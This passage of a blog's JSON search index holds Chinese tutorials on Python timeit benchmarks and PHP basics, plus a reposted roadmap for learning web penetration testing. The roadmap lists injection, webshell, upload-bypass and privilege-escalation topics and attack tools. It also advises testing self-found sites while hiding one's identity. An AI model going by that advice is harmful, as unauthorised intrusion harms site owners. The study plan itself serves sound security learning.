&lt;/html&gt;","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"dowhile循环","slug":"dowhile循环","permalink":"https://xiaowuyoucy.github.io/tags/dowhile循环/"}]},{"title":"Python内置方法的时间复杂度测试分析","slug":"20150410224","date":"2015-03-30T20:13:18.000Z","updated":"2019-04-14T18:22:26.522Z","comments":true,"path":"2015/03/31/20150410224/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/03/31/20150410224/","excerpt":"","text":"timeit模块 timeit模块可以用来测试一小段Python代码的执行速度。 class timeit.Timer(stmt=‘pass’, setup=‘pass’, timer=) Timer是测量小段代码执行速度的类。 stmt参数是要测试的代码语句（statment）； setup参数是运行代码时需要的设置； timer参数是一个定时器函数，与平台有关。 timeit.Timer.timeit(number=1000000) Timer类中测试语句执行速度的对象方法。number参数是测试代码时的测试次数，默认为1000000次。方法返回执行代码的平均耗时，一个float类型的秒数。 list的操作测试 12345678910111213141516171819202122232425262728def test1(): l = [] for i in range(1000): l = l + [i]def test2(): l = [] for i in range(1000): l.append(i)def test3(): l = [i for i in range(1000)]def test4(): l = list(range(1000))from timeit import Timert1 = Timer(\"test1()\", \"from __main__ import test1\")print(\"concat \",t1.timeit(number=1000), \"seconds\")t2 = Timer(\"test2()\", \"from __main__ import test2\")print(\"append \",t2.timeit(number=1000), \"seconds\")t3 = Timer(\"test3()\", \"from __main__ import test3\")print(\"comprehension \",t3.timeit(number=1000), \"seconds\")t4 = Timer(\"test4()\", \"from __main__ import test4\")print(\"list range \",t4.timeit(number=1000), \"seconds\")# ('concat ', 1.7890608310699463, 'seconds')# ('append ', 0.13796091079711914, 'seconds')# ('comprehension ', 0.05671119689941406, 'seconds')# ('list range ', 0.014147043228149414, 'seconds') pop操作测试 123456789x = range(2000000)pop_zero = Timer(\"x.pop(0)\",\"from __main__ import x\")print(\"pop_zero \",pop_zero.timeit(number=1000), \"seconds\")x = range(2000000)pop_end = Timer(\"x.pop()\",\"from __main__ import x\")print(\"pop_end \",pop_end.timeit(number=1000), \"seconds\")# ('pop_zero ', 1.9101738929748535, 'seconds')# ('pop_end ', 0.00023603439331054688, 'seconds') 测试pop操作：从结果可以看出，pop最后一个元素的效率远远高于pop第一个元素 可以自行尝试下list的append(value)和insert(0,value),即一个后面插入和一个前面插入？？？ list内置操作的时间复杂度 dict内置操作的时间复杂度","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"时间复杂度测试","slug":"时间复杂度测试","permalink":"https://xiaowuyoucy.github.io/tags/时间复杂度测试/"}]},{"title":"WEB安全渗透学习指南","slug":"201502092357","date":"2015-03-09T13:33:18.000Z","updated":"2019-04-23T15:15:27.231Z","comments":true,"path":"2015/03/09/201502092357/","link":"","permalink":"https://xiaowuyoucy.github.io/2015/03/09/201502092357/","excerpt":"","text":"学习规划： 作者：向生李 链接：http://www.zhihu.com/question/21914899/answer/39344435 来源：知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 Web安全相关概念 熟悉基本概念（SQL注入、上传、XSS、CSRF、一句话木马等）。 通过关键字（SQL注入、上传、XSS、CSRF、一句话木马等）进行Google/SecWiki； 阅读《精通脚本黑客》，虽然很旧也有错误，但是入门还是可以的； 看一些渗透笔记/视频，了解渗透实战的整个过程，可以Google（渗透笔记、渗透过程、入侵过程等）； 3周 熟悉渗透相关工具 熟悉AWVS、sqlmap、Burp、nessus、chopper、nmap、Appscan等相关工具的使用。 了解该类工具的用途和使用场景，先用软件名字Google/SecWiki； 下载无后们版的这些软件进行安装； 学习并进行使用，具体教材可以在SecWiki上搜索，例如：Brup的教程、sqlmap； 待常用的这几个软件都学会了可以安装音速启动做一个渗透工具箱； 5周 渗透实战操作掌握渗透的整个阶段并能够独立渗透小型站点。 网上找渗透视频看并思考其中的思路和原理，关键字（渗透、SQL注入视频、文件上传入侵、数据库备份、dedecms漏洞利用等等）； 自己找站点/搭建测试环境进行测试，记住请隐藏好你自己； 思考渗透主要分为几个阶段，每个阶段需要做那些工作，例如这个：PTES渗透测试执行标准； 研究SQL注入的种类、注入原理、手动注入技巧； 研究文件上传的原理，如何进行截断、双重后缀欺骗(IIS、PHP)、解析漏洞利用（IIS、Nignix、Apache）等，参照：上传攻击框架； 研究XSS形成的原理和种类，具体学习方法可以Google/SecWiki，可以参考：XSS； 研究Windows/Linux提权的方法和具体使用， 可以参考：提权； 可以参考: 开源渗透测试脆弱系统； 1周 关注安全圈动态 关注安全圈的最新漏洞、安全事件与技术文章。 通过SecWiki浏览每日的安全技术文章/事件； 通过Weibo/twitter关注安全圈的从业人员（遇到大牛的关注或者好友果断关注），天天抽时间刷一下； 通过feedly/鲜果订阅国内外安全技术博客（不要仅限于国内，平时多注意积累），没有订阅源的可以看一下SecWiki的聚合栏目； 养成习惯，每天主动提交安全技术文章链接到SecWiki进行积淀； 多关注下最新漏洞列表，推荐几个：exploit-db、CVE中文库、Wooyun等，遇到公开的漏洞都去实践下。 关注国内国际上的安全会议的议题或者录像，推荐SecWiki-Conference。 3周 熟悉Windows/Kali Linux 学习Windows/Kali Linux基本命令、常用工具； 熟悉Windows下的常用的cmd命令，例如：ipconfig,nslookup,tracert,net,tasklist,taskkill等； 熟悉Linux下的常用命令，例如：ifconfig,ls,cp,mv,vi,wget,service,sudo等； 熟悉Kali Linux系统下的常用工具，可以参考SecWiki,《Web Penetration Testing with Kali Linux》、《Hacking with Kali》等； 熟悉metasploit工具，可以参考SecWiki、《Metasploit渗透测试指南》。 3周 服务器安全配置 学习服务器环境配置，并能通过思考发现配置存在的安全问题。 Windows2003/2008环境下的IIS配置，特别注意配置安全和运行权限，可以参考：SecWiki-配置； Linux环境下的LAMP的安全配置，主要考虑运行权限、跨目录、文件夹权限等，可以参考：SecWiki-配置； 远程系统加固，限制用户名和口令登陆，通过iptables限制端口； 配置软件Waf加强系统安全，在服务器配置mod_security等系统，参见SecWiki-ModSecurity； 通过Nessus软件对配置环境进行安全检测，发现未知安全威胁。 4周 脚本编程学习 选择脚本语言Perl/Python/PHP/Go/Java中的一种，对常用库进行编程学习。 搭建开发环境和选择IDE，PHP环境推荐Wamp和XAMPP，IDE强烈推荐Sublime，一些Sublime的技巧：SecWiki-Sublime； Python编程学习，学习内容包含：语法、正则、文件、网络、多线程等常用库，推荐《Python核心编程》，不要看完； 用Python编写漏洞的exp，然后写一个简单的网络爬虫，可参见SecWiki-爬虫、视频； PHP基本语法学习并书写一个简单的博客系统，参见《PHP与MySQL程序设计（第4版）》、视频； 熟悉MVC架构，并试着学习一个PHP框架或者Python框架（可选）； 了解Bootstrap的布局或者CSS，可以参考：SecWiki-Bootstrap; 3周 源码审计与漏洞分析 能独立分析脚本源码程序并发现安全问题。 熟悉源码审计的动态和静态方法，并知道如何去分析程序，参见SecWiki-审计； 从Wooyun上寻找开源程序的漏洞进行分析并试着自己分析； 了解Web漏洞的形成原因，然后通过关键字进行查找分析，参见SecWiki-代码审计、高级PHP应用程序漏洞审核技术； 研究Web漏洞形成原理和如何从源码层面避免该类漏洞，并整理成checklist。 5周 安全体系设计与开发 能建立自己的安全体系，并能提出一些安全建议或者系统架构。 开发一些实用的安全小工具并开源，体现个人实力； 建立自己的安全体系，对公司安全有自己的一些认识和见解； 提出或者加入大型安全系统的架构或者开发；","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"web安全渗透","slug":"web安全渗透","permalink":"https://xiaowuyoucy.github.io/tags/web安全渗透/"}]},{"title":"PHP中的4个预定义变量","slug":"201409240602","date":"2014-09-23T21:00:00.000Z","updated":"2019-09-24T13:45:36.071Z","comments":true,"path":"2014/09/24/201409240602/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201409240602/","excerpt":"","text":"$_GET 代表浏览器表单通过“get”方式提交的所有数据（集），可以称为“get数据”。 也可以理解为： $_GET变量里面会“自动存储”（保存/装载）提交到某个文件中的GET数据。 而GET数据，是在一个页面以“get”方式请求的时候提交的数据。 代码演示： 制作一个表单，有两个输入框，可以输出数字，并提交。 到另一个页面（文件）中，计算这两个数字的和！ 对该加法计算的一个改进： $_POST 代表浏览器表单通过“post”方式提交的所有数据（集），可以称为“POST数据”。 也可以理解为： $_POST变量里面会“自动存储”（保存/装载）提交到某个文件中的POST数据。 而POST数据，是在一个表单中以“post”方式提交的数据。 代码演示： 有个表单，两个输入框，可以填写数字，有一个“提交按钮”，点击提交，可以计算他们的和并输出。 扩展（提交给自己！）： $_REQUEST 代表浏览器通过“get”方式 或 “post”方式提交的数据的合集。 即：它既能接收到get过来的数据，也能接收到post过来的数据！ 通常，一个表单，只提交一种形式的数据，要么get数据，要么post数据！ 代码演示： 但，有一个情况，提交post数据的同时，也可以提交get数据： $_SERVER 它代表任何一次请求中，客户端或服务器端的一些“基本信息”或系统信息，包括很多（10多项）。 我们无非就是要知道，哪些信息是可以供我们使用的！ 常用的有： PHP_SELF： 表示当前请求的网页地址（不含域名部分） SERVER_NAME： 表示当前请求的服务器名 SERVER_ADDR： 表示当前请求的服务器IP地址 DOCUMENT_ROOT： 表示当前请求的网站物理路径（apache设置站点时那个） REMOTE_ADDR： 表示当前请求的客户端的IP地址 SCRIPT_NAME： 表示当前网页地址 代码演示：","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"$_GET","slug":"GET","permalink":"https://xiaowuyoucy.github.io/tags/GET/"},{"name":"$_POST，$_SERVER","slug":"POST，-SERVER","permalink":"https://xiaowuyoucy.github.io/tags/POST，-SERVER/"},{"name":"$_REQUEST","slug":"REQUEST","permalink":"https://xiaowuyoucy.github.io/tags/REQUEST/"}]},{"title":"PHP变量的4个基本操作","slug":"201409240457","date":"2014-09-23T21:00:00.000Z","updated":"2019-09-24T17:59:22.040Z","comments":true,"path":"2014/09/24/201409240457/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201409240457/","excerpt":"","text":"1 赋值操作 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $name = \"PHP是世界上最好的语言\"; # 将数值1放入到变量（V1）中 #变量初始赋值后，可以后续再去重新赋值——这就是修改了变量的值，比如： #$name = “PHP不是世界上最好的语言”; ?&gt;&lt;/body&gt;&lt;/html&gt; 变量赋值的本质是：将变量名，跟一个数据“建立关联（联系） 2 取值操作 取值，就是，从变量这个容器中拿到其中存储的数据（值）； 取值无处不在：凡是使用到变量，并在该位置上，需要一个“数据”的时候，就会发生取值操作 3 判断变量isset() 就是判断一个“变量名”是否里面存储了数据！ 判断的结果是：true（真，表示有），或者false（假，表示没有）。 使用这个语法来判断：isset( $变量名 ); 还有一个特殊的赋值，赋值后，变量中也没有数据，如下： $v5 = null; //null是一个特殊的“数据”（值），该数据的含义是：没有数据。 即此时判断 isset($v5)的结果是“false”。 4 删除/销毁变量unset() 123456789101112131415161718&lt;?php $v1 = 1;$result = isset($v1); //将对变量v1的判断结果放到$result中echo $result; //实际结果是“true”，但echo输出后为“1”echo \"&lt;br&gt;\";var_dump($result); //这也是输出！ //var_dump()可以输出一个变量的完整信息$result2 = isset($v3);echo \"&lt;br&gt;v3的结果为：\";var_dump($result2);//下面演示unset掉一个变量后的结果：unset($v1); //销毁该变量！$result3 = isset($v1);echo \"&lt;br&gt;v1被unset()之后为：\";var_dump($result3);echo $v1; ?&gt; 当一个变量中存储了数据，我们也可以去销毁（删除）它，语法如下： unset( $变量名 ）。 删除变量的本质是：断开变量名跟其关联过的那个数据之间的“联系”，图示如下： 此时，该变量就不再指向某个数据了，其isset()判断的结果为false。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"php变量","slug":"php变量","permalink":"https://xiaowuyoucy.github.io/tags/php变量/"},{"name":"变量的操作","slug":"变量的操作","permalink":"https://xiaowuyoucy.github.io/tags/变量的操作/"}]},{"title":"PHP常量","slug":"201409242200","date":"2014-09-23T21:00:00.000Z","updated":"2019-09-24T15:59:31.901Z","comments":true,"path":"2014/09/24/201409242200/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201409242200/","excerpt":"","text":"define()函数形式： define(‘常量名’, 对应的常量值); 常量名推荐使用“全大写”。 const关键字定义： const 常量名 = 对应的常量值; 演示： 常量的两种取值形式 直接使用： echo 常量名； //注意：使用常量，前面不带”$”符号，也不能有引号 使用constant()函数以取值： echo constant(‘常量名’); //注意，此时常量名要用引号引起来。 变量与常量的区别： 1，变量的数据可以变化（重新赋值），常量不可以。 2，变量可以存储各种数据类型，而常量只能存储简单数据类型。 3，给变量赋值可以是“计算”结果，但给常量赋值，只能是“直接写出的值”（字面值） 判断一个常量是否存在：defined(); 判断的结果返回：true（表示存在）或false（表示不存在） 形式： if（ defined (‘常量名’) ) { //如果该常量名存在，则… //…做什么事情。。。。 } 演示：","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"PHP常量","slug":"PHP常量","permalink":"https://xiaowuyoucy.github.io/tags/PHP常量/"},{"name":"PHP两种定义常量的形式","slug":"PHP两种定义常量的形式","permalink":"https://xiaowuyoucy.github.io/tags/PHP两种定义常量的形式/"}]},{"title":"PHP中的3个魔术常量","slug":"201909250033","date":"2014-09-23T16:33:00.000Z","updated":"2019-09-24T16:37:00.239Z","comments":true,"path":"2014/09/24/201909250033/","link":"","permalink":"https://xiaowuyoucy.github.io/2014/09/24/201909250033/","excerpt":"","text":"含义： 魔术常量也是常量，只是在形式上为常量，而其值其实是“变化”的。 他们也是系统中预先定义好的，也就几个，下面是最常用的 3个： DIR ：代表当前php网页文件所在的目录 FILE ：代表当前php网页文件本身的路径 LINE, ：代表当前这个常量所在的行号","categories":[{"name":"PHP","slug":"PHP","permalink":"https://xiaowuyoucy.github.io/categories/PHP/"}],"tags":[{"name":"__DIR__","slug":"DIR","permalink":"https://xiaowuyoucy.github.io/tags/DIR/"},{"name":"__FILE__","slug":"FILE","permalink":"https://xiaowuyoucy.github.io/tags/FILE/"},{"name":"__LINE__","slug":"LINE","permalink":"https://xiaowuyoucy.github.io/tags/LINE/"}]}]}